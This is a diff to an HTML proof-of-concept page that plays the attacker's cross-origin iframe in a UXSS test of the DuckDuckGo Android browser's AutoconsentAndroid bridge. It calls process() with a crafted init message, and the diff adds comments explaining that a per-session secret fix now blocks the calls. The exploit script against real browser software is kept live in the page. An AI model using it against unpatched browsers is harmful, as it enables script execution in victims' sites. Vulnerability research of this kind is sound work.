@@ -9,6 +9,8 @@
     .ok  { color: #4caf50; }
     .err { color: #f44336; }
     .info{ color: #2196f3; }
+    .warn{ color: #ff9800; }
+    .banner { background: #3e2723; border: 1px solid #f44336; border-radius: 4px; padding: 10px; margin-bottom: 14px; color: #ffccbc; font-size: 0.9rem; }
     pre  { background: #111; padding: 10px; border-radius: 4px; word-wrap: break-word; white-space: pre-wrap; }
     #log { list-style: none; padding: 0; margin: 0; }
     #log li { margin: 3px 0; }
@@ -16,12 +18,45 @@
 </head>
 <body>
 
-  <h1>☠️  UXSS PoC — Attacker iframe</h1>
-  <p class="info">
-    This page is loaded as a <strong>cross-origin iframe</strong> inside victim.html.
-    It calls <code>AutoconsentAndroid.process()</code> from a cross-origin context.
-    Android does <em>not</em> enforce SOP on <code>@JavascriptInterface</code> calls.
-  </p>
+  <h1>☠️  UXSS PoC — Attacker iframe (Autoconsent)</h1>
+
+  <!--
+    ══════════════════════════════════════════════════════════════════════
+    WHY THIS PoC DOES NOT WORK ON THE CURRENT BUILD
+    ══════════════════════════════════════════════════════════════════════
+
+    The vulnerability this page targets has been FIXED in this repository.
+
+    PRE-FIX (vulnerable) method signature:
+      @JavascriptInterface
+      fun process(message: String)          ← one arg, no secret
+
+    CURRENT (fixed) method signature:
+      @JavascriptInterface
+      fun process(message: String, secret: String)   ← two args, secret required
+
+    When this page calls AutoconsentAndroid.process(initPayload) with ONE
+    argument, Android WebView's bridge finds NO matching one-arg method.
+    The call is silently dropped — no UXSS occurs.
+
+    Even calling process(initPayload, '') with two args fails: the empty
+    string does not match the per-session UUID stored server-side, so the
+    secret check returns immediately.
+
+    The interface IS accessible from this cross-origin iframe (SOP does not
+    protect @JavascriptInterface methods) — but the fix makes it useless
+    without the correct per-session secret, which this iframe cannot obtain
+    because window.autoconsentAndroidSecret lives in the parent frame and
+    SOP prevents cross-origin reads.
+    ══════════════════════════════════════════════════════════════════════
+  -->
+
+  <div class="banner">
+    ⚠️ <strong>NOTE:</strong> This PoC targets the <em>pre-fix</em> (vulnerable) version of
+    <code>AutoconsentInterface</code>. The current codebase already has the fix applied
+    (<code>process(message, secret)</code> — two args required). The attack calls below
+    will be silently dropped. See README for details.
+  </div>
 
   <ul id="log"></ul>
 
@@ -29,16 +64,26 @@
     /* ====================================================================
        UXSS Proof-of-Concept — Attacker's cross-origin iframe
 
-       Vulnerability:  AutoconsentInterface (pre-fix)
-       Bridge method:  AutoconsentAndroid.process(message)     ← one arg, no secret
-       Effect:         Android calls webView.evaluateJavascript() in the
-                       MAIN FRAME's JS context, giving us code execution in
-                       the victim page's origin despite the Same-Origin Policy.
+       Target vulnerability: AutoconsentInterface (pre-fix)
+       Pre-fix bridge method:  AutoconsentAndroid.process(message)  ← one arg
+       Current (fixed) method: AutoconsentAndroid.process(message, secret)
 
-       Fixed version:  AutoconsentAndroid.process(message, secret)   ← two args
-                       Secret is a per-session UUID stored in
-                       window.autoconsentAndroidSecret on the main frame only.
-                       Cross-origin iframes cannot read that variable (SOP).
+       WHY THE ATTACK FAILS ON THE CURRENT BUILD:
+       ===========================================
+       The fixed method requires a second argument: a per-session UUID secret
+       that is injected only into the MAIN FRAME's JS context. Cross-origin
+       iframes cannot read window.autoconsentAndroidSecret from the parent
+       frame (Same-Origin Policy blocks the read).
+
+       When this page calls process(payload) with ONE arg, Android's WebView
+       bridge looks for a @JavascriptInterface method named "process" that
+       accepts exactly one String. It finds the two-arg method instead.
+       On some Android versions this throws; on others it's a silent no-op.
+       Either way, the UXSS payload is never executed.
+
+       The interface itself IS callable from cross-origin frames — this is
+       the core design flaw that the vulnerability class exploits. The fix
+       adds a credential layer on top that cross-origin frames can't bypass.
        ==================================================================== */
 
     function log(msg, cls) {
@@ -46,7 +91,7 @@
       li.className = cls || '';
       li.innerHTML = '[' + new Date().toISOString() + '] ' + msg;
       document.getElementById('log').appendChild(li);
-      /* Also report status to victim page for UI feedback. */
+      /* Report status to victim page for UI feedback (postMessage is cross-origin-safe). */
       window.parent.postMessage({ pocType: 'attacker-status', text: msg }, '*');
     }
 
@@ -58,85 +103,70 @@
       if (typeof AutoconsentAndroid === 'undefined') {
         log(
           '<span class="err">AutoconsentAndroid NOT found.</span> ' +
-          'Are you running this in the <strong>DuckDuckGo Android browser</strong> ' +
-          'with the autoconsent feature enabled? ' +
+          'Are you running this in the <strong>DuckDuckGo Android browser</strong>? ' +
           'The interface is only injected by the app — it will not appear in desktop browsers.',
           'err'
         );
-        log('Hint: enable "Auto-dismiss cookie pop-ups" in DDG Settings → Privacy → Manage notifications.', 'info');
         return;
       }
 
-      log('<span class="ok">AutoconsentAndroid interface FOUND</span> — bridge is accessible from this cross-origin iframe!', 'ok');
+      log('<span class="ok">AutoconsentAndroid interface FOUND</span> — bridge IS accessible from this cross-origin iframe (SOP does not block @JavascriptInterface calls).', 'ok');
 
-      /* ── Phase 2: Determine the victim URL ───────────────────────────
-         document.referrer gives us the URL of the parent page (victim.html).
-         In practice an attacker would target specific known URLs; here we
-         use the referrer so the init message looks legitimate to the handler. */
       var victimUrl = document.referrer || 'http://localhost:8080/victim.html';
-      log('Victim URL (from document.referrer): ' + victimUrl, 'info');
+      log('Parent page URL (document.referrer): ' + victimUrl, 'info');
 
-      /* ── Phase 3: Fire the UXSS attack ──────────────────────────────
-         We call AutoconsentAndroid.process() with a crafted "init" message.
-         On the VULNERABLE (pre-fix) version this method takes ONE argument:
-           process(message: String)
-         On the FIXED version it takes TWO:
-           process(message: String, secret: String)
-         and rejects any call where the secret doesn't match the per-session UUID.
+      var initPayload = JSON.stringify({ type: 'init', url: victimUrl });
+      log('Crafting init payload: <code>' + initPayload + '</code>', 'info');
 
-         We attempt the vulnerable one-argument call first, then a two-argument
-         call with an empty secret (which the fixed version will also reject). */
-
-      var initPayload = JSON.stringify({
-        type: 'init',
-        url:  victimUrl
-      });
-
-      log('Sending crafted init message: <code>' + initPayload + '</code>', 'info');
-
-      /* ── VULNERABLE PATH (pre-fix): one argument, no secret required ── */
+      /* ── VULNERABLE PATH (pre-fix): one argument, no secret required ── *
+       * On the UNPATCHED version, this would trigger InitMessageHandlerPlugin,
+       * which would call webView.evaluateJavascript() in the MAIN FRAME's
+       * context — a full UXSS.
+       *
+       * On the CURRENT (patched) build, the one-arg method no longer exists.
+       * Android WebView finds no matching signature → call is silently dropped.
+       * ─────────────────────────────────────────────────────────────────── */
       try {
         AutoconsentAndroid.process(initPayload);
         log(
-          '<span class="ok">process(message) called successfully with ONE argument!</span><br>' +
-          'On the vulnerable build this triggers InitMessageHandlerPlugin, which calls<br>' +
-          '<code>webView.evaluateJavascript("javascript:window.autoconsentMessageCallback(initResp, origin)", null)</code><br>' +
-          'in the <strong>main frame\'s JS context</strong> — i.e., victim.html\'s origin.<br>' +
-          'Watch victim.html\'s evidence log for confirmation.',
-          'ok'
+          '<span class="warn">process(message) call returned without throwing.</span> ' +
+          'On the PATCHED build this is a silent no-op (no matching one-arg method). ' +
+          'No UXSS is executed. ' +
+          'On the VULNERABLE (pre-fix) build this would trigger UXSS — watch victim.html evidence log.',
+          'warn'
         );
       } catch (e) {
-        log('process(message) one-arg call threw: ' + e.message, 'err');
+        log('process(message) threw (expected on patched build): ' + e.message, 'info');
       }
 
-      /* ── FIXED PATH: same call with empty secret (will be rejected) ── */
+      /* ── FIXED PATH: two args, empty secret (will be rejected by secret check) ── */
       setTimeout(function () {
         try {
-          AutoconsentAndroid.process(initPayload, '');   /* empty secret → rejected */
+          AutoconsentAndroid.process(initPayload, '');
           log(
-            'process(message, "") called (two args, empty secret). ' +
-            'On the fixed build this is silently dropped by the secret check. ' +
-            'On the vulnerable build (single-param method) this is also a no-op ' +
-            'because the method signature doesn\'t match two args.',
-            'info'
+            'process(message, "") returned (two args, empty secret). ' +
+            'Patched build: silent reject — empty string ≠ per-session UUID. No UXSS.',
+            'warn'
           );
         } catch (e) {
-          log('process(message, "") threw: ' + e.message, 'err');
+          log('process(message, "") threw: ' + e.message, 'info');
         }
 
-        /* NOTE: We intentionally do NOT try to read window.top.autoconsentAndroidSecret.
-           Accessing any property of a cross-origin frame's window object throws
-           "Blocked a frame with origin X from accessing a cross-origin frame" (SOP).
-           That error is expected — it means the fix's secret is properly protected.
-           But attempting the read from here would produce a confusing error that looks
-           like the PoC itself failed. The SOP protection of the secret is proven simply
-           by the fact that we don't know it and cannot guess the per-session UUID. */
-        log('Note: window.top.autoconsentAndroidSecret is protected by SOP — we cannot read it from this cross-origin iframe, which is why the secret-based fix works.', 'info');
-
-        log('Attack sequence complete. Check victim.html for the UXSS evidence log.', 'info');
+        /* NOTE: We do NOT attempt to read window.top.autoconsentAndroidSecret.
+           Cross-origin reads of any frame window property throw a SecurityError
+           ("Blocked a frame with origin X from accessing a cross-origin frame").
+           That error is correct and expected — it proves the secret is protected.
+           But attempting it here produces a confusing message that looks like the
+           PoC itself crashed, not like expected SOP enforcement. */
+        log(
+          'Summary: AutoconsentAndroid interface IS accessible from this cross-origin iframe. ' +
+          'The ATTACK fails only because the fix requires a secret this iframe cannot obtain. ' +
+          'See victim.html log — if UXSS evidence appeared there, the build is VULNERABLE.',
+          'info'
+        );
       }, 300);
 
-    }, 500);   /* 500 ms delay — gives victim.html time to arm its interceptor first */
+    }, 500);
   </script>
 
 </body>
